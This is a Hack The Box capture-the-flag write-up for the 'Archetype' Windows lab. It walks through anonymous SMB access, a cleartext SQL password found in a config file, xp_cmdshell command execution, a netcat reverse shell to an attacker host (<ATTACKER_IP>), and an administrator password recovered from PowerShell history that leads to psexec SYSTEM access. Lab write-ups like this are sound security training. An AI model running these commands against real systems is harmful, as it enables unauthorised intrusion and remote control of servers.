# 🧠 HTB Write-Up: Archetype

**Difficulty:** Tier 2  
**Category:** Windows, Samba, SQL
**Release Date:** October 25, 2021 
**Date Completed:** 06/02/2025
**IP Address:** 10.129.6.55
**Flags Collected:** ✅ User | ✅ Root

---

## 📌 Summary

> Exploited a misconfiguration in the Microsoft SQL Server.  

---

## 🔎 Enumeration

### 🔹 Nmap

```
nmap -sC -sV -oN nmap_initial [IP]
```

**Findings:**
- Port 135: msrpc Microsoft Windows RPC
- Port 139: netbios-ssn Microsoft Windows netbios-ssn
- Port 445: microsoft-ds Windows Server 2019 Standard 17763
- Port 1433:  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00

### 🔹 smbclient

```
smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to list the available shares on the server (like backups, IPC$, etc.)
```

> SMB was found to be configured with no password.
> Shares `ADMIN$` and `C$` gave “Access Denied” however .... 
> Proceeded to enumerate backups.  Note, this can very much be a goldmine for attackers during enumeration, as it was here.

```
smbclient -N \\\\{TARGET_IP}\\backups### 
```

> The config file “prod.dtsConfig” was found.  Config files like this can be full of clues for penetration.
 
```
get prod.dtsConfig
```
> Got the config file using `get` for further offline inspection.
> The file was saved in the directory from which the SMB session was launched.
> Clear text password was found within the config file.
---

## 🧬 Exploitation
### 🔹 Initial Access:  Establishing the Foothold

- Vulnerability: found plain text password into the SQL server.
- Tool/Script used: *Impacket, a collection of Python classes for working with network protocols. It provides low-level programmatic access to network traffic, including the ability to construct and parse raw packets. For some protocols — such as SMB (versions 1 through 3) and MSRPC — Impacket includes full protocol implementations.*

  *The object-oriented API allows developers and security professionals to easily interact with complex network protocols. In addition to the core library, Impacket includes a suite of command-line tools that demonstrate how the classes can be used in practice. In this case, the tool `mssqlclient.py` was used to connect to and interact with a Microsoft SQL Server instance.*


```
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

**Result:** Authentication to the Microsoft SQL Server as “sql-svc”

---

### 🔹 Getting the Foothold
While logging into the SQL server is definitely an accomplishment, where do we go from here?  Getting some elemental idea of who you are, and where you are is fundamental to figuring out the next step to get control of the system.
- SQL “help” reveals that the xp_cmdshell is available.  *This is a fundamental vector of attack, specifically RCE Vector.  The exploit to aim for here is Remote Code Execution.*
- Check permissions.  Does sql_svc have permissions to implement the command shell?
```
   SELECT is_srvrolemember('sysadmin');
```
- SQL responds “1” ... sql_svc indeed has the role of sysadmin and thus is able to invoke it.
- Check if xp_cmdshell is already invoked:
 `SQL> EXEC xp_cmdshell 'net user';`
---

## 🚀 Setting up command execution through xp_cmdshell

*‌ NOTE:  On MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:*

```
EXEC xp_cmdshell 'net user'; -- priv 
-- Enable xp_cmdshell (if disabled)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Run system command
EXEC xp_cmdshell 'net user';
```

Let’s get our bearings:  Where are we, and who are we?

`SQL > xp_cmdshell “whoami”`

If you succeeded, you’ll get the user account you’re logged in as.  In this case, it’s sql_svc.

`SQL xp_cmdshell “powershell -c pwd”`

We are in “`C:\Windows\system32`”.

### 🔹 Setting up a reverse shell with nc64.exe
We’ve gained command execution via xp_cmdshell, but typing `xp_cmdshell` before every command is tedious. A reverse shell gives us direct, interactive access — making post-exploitation much easier.

This method involves two main steps:
	- Upload nc64.exe to the target via a simple HTTP server
	- Trigger the binary to connect back to our Netcat listener

🖥️ Step 1: Host nc64.exe on Your Attack Machine
Make sure nc64.exe is in your current directory, then start a Python HTTP server:

`sudo python3 -m http.server 80`

This allows the target machine to download the file.

📡 Step 2: Download nc64.exe from the Target
In your mssqlclient.py shell, run:

```
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; wget http://<ATTACKER_IP>/nc64.exe -OutFile nc64.exe"';
```

This tells the target to connect to your attack box and download the Netcat binary into the Downloads directory.

🖥️ Step 3: Start the Netcat Listener
Before launching the reverse shell, get ready to receive it:

`sudo nc -lvnp 443`

💥 Step 4: Execute the Reverse Shell
Trigger the connection from the target back to your listener:

`EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\nc64.exe <ATTACKER_IP> 443 -e cmd.exe';`

If successful, you'll catch a Windows command shell on your listener.  The user flag is found on the user’s Desktop.

### 🚀 Privilege Escalation
We are in the phase of the hack in which our goal is to obtain root.  The tool winPEAS64.exe will be the tool we use to find possible escalation paths.  We will once again use the Python HTTP server to run it on the target computer.

`python3 -m http.server 80`

We’ll use wget again to have the target machine download winPEAS.

`wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe`

We can execute the binary.  So much simpler to do with the remote shell.

`PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe`

Warning:  the output is long and can feel a bit overwhelming to go through.  Below is a list to help put the output into context

🔍 What winPEAS Looks For:
- Misconfigurations that allow escalation (e.g., unquoted service paths, weak permissions)
- Service issues (e.g., services running as SYSTEM with writable binaries)
- Credential leaks in memory, files, or registry
- Token privileges (SeImpersonatePrivilege, SeDebugPrivilege, etc.)
- Auto-run executables and scheduled tasks
- AlwaysInstallElevated settings
- DLL hijacking opportunities
- Interesting files and user activity

While there are other possibilities of attack, we are working in a user account with system privileges, so the quickest path may be to check history for frequently accessed files or executed commands.  `ConsoleHost_history.txt` stands out in this regard.  It’s located in `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`.  We navigate to the folder and read the contents.

type ConsoleHost_history.txt

And behold ..... 

`net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dmln!!`

We have found the administrator password.  But how can we use this credential?  Looking back on our initial nmap scan, there’s no apparent way to take advantage of the administrator credential we found.  Here’s the rundown:

#### 🚫 No GUI or Remote Shell Access Available

| Service | Status | Notes |
|---------|--------|-------|
| **RDP (port 3389)** | ❌ Closed | Confirmed via `nmap` scan |
| **SSH** | ❌ Not applicable | Windows does not use SSH by default |
| **WinRM (5985/5986)** | ❌ Not open | So `evil-winrm` was not viable |
| **Telnet** | ❌ Not enabled | Not a common vector in modern boxes |

---

#### ✅ What *Was* Available?

- SMB (port 445) was **open**
- Administrator credentials (or NTLM hash) were **available**

---

#### 🛠️ Why `psexec.py`?
Psexec.py, is another class in the Impacket suite and is designed to mimic Windows classic utility PsExec (short for *Process Execute*). While previously, we exploited weak sql configuration use sql’s built-in backdoor utility to get deeper access to the server via xp_cmdshell, Psexec.py builds a backdoor to the system via SMB on its own and returns a semi-interactive shell.  This makes it especially valuable when RDP or WinRM are unavailable.

### 🧰 Comparing Other Remote Execution Tools

Below is a breakdown of other such “backdoor” tools to give a clear idea of why `psexec.py` was the perfect tool in this instance.
---
#### 🔄 Other Back-door Tools

| Tool | Viable? | Notes |
|------|---------|-------|
| **`wmiexec.py`** | ✅ | Uses WMI for command execution, but less interactive |
| **`smbexec.py`** | ✅ | Avoids service creation, slightly stealthier |
| **`evil-winrm`** | ❌ | Requires WinRM (5985/5986) — not open |
| **Manual Netcat Reverse Shell** | ✅ | Possible via `xp_cmdshell`, but less stable and not SYSTEM |
| **PowerShell Remoting** | ❌ | Also depends on WinRM ports being open |

---

`python3 psexec.py administrator@{TARGET_IP}`

Now, we have a shell as the administrator!  A simple `dir` from the Administrator Desktop, and we see root.txt and our flag.

🏁 **### 🏁 Post-Root Wrap-Up

🏁 **Archetype pawned.****

### 🔗 Attack Chain Summary

1. **Initial Access via Anonymous SMB Share**  
   - Discovered an open SMB share (`backups`) with **anonymous access**.  
   - Retrieved a configuration file (`prod.dtsConfig`) containing **hardcoded SQL credentials** for the `sql_svc` user.

2. **Foothold via SQL Server Login**  
   - Used `mssqlclient.py` (from Impacket) to authenticate to the target’s **Microsoft SQL Server** using the recovered `sql_svc` credentials.  
   - Verified that `xp_cmdshell` was enabled and that `sql_svc` had **sysadmin privileges**, enabling **command execution**.

3. **Reverse Shell with `nc64.exe`**  
   - Served `nc64.exe` from a local HTTP server.  
   - Used PowerShell via `xp_cmdshell` to download it to the target.  
   - Executed a reverse shell from the target to gain a **more interactive session**.

4. **Privilege Escalation**  
   - Searched for sensitive files and discovered that the **administrator password** had been previously entered and was saved in a command history file (`ConsoleHost_history.txt`).  
   - This revealed **cleartext Administrator credentials**.

5. **Administrator Shell via `psexec.py`**  
   - Used the admin credentials and `psexec.py` to authenticate over SMB.  
   - Achieved a **full SYSTEM shell** on the target.


